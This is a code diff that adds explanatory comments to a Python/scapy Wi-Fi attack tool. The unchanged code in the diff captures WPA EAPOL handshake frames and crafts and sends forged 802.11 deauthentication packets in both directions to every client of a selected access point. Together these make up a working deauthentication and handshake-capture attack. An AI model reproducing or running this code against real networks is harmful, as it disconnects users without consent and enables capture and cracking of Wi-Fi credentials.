@@ -116,8 +116,9 @@ class NetworkScanner():
 
     def handle_eapol(self, pkt: Packet):
         """Process EAPOL packet, save key message type"""
-
+        # Message type (1/2/3/4/0)
         msg_type = pkt[EAPOL_KEY].guess_key_number()
+
         if pkt[Dot11].addr1 in self.bssid_map:
             self.bssid_map[pkt[Dot11].addr1].eapol_messages[msg_type] = pkt
         elif pkt[Dot11].addr2 in self.bssid_map:
@@ -134,11 +135,16 @@ class NetworkScanner():
     def deauth(self):
         """Craft and send deauthentication packets"""
         self.deauth_packet_count = 0
+        # Number of packets to send
         self.max_packets = 10 * len(self.selected_ap.clients)
         while not self.deauth_packet_count >= self.max_packets:
             for client in self.selected_ap.clients:
+                # From AP to client
                 ap_to_client = RadioTap()/Dot11(type=0, subtype=12, addr1=self.selected_ap.bssid, addr2=client, addr3=self.selected_ap.bssid)/Dot11Deauth()
+                # From client to AP
                 client_to_ap = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=self.selected_ap.bssid, addr3=self.selected_ap.bssid)/Dot11Deauth()
+                
+                # Send packets and update packet count
                 sendp(ap_to_client, iface=self.interface_name, verbose=False)
                 self.deauth_packet_count += 1
                 sendp(client_to_ap, iface=self.interface_name, verbose=False)
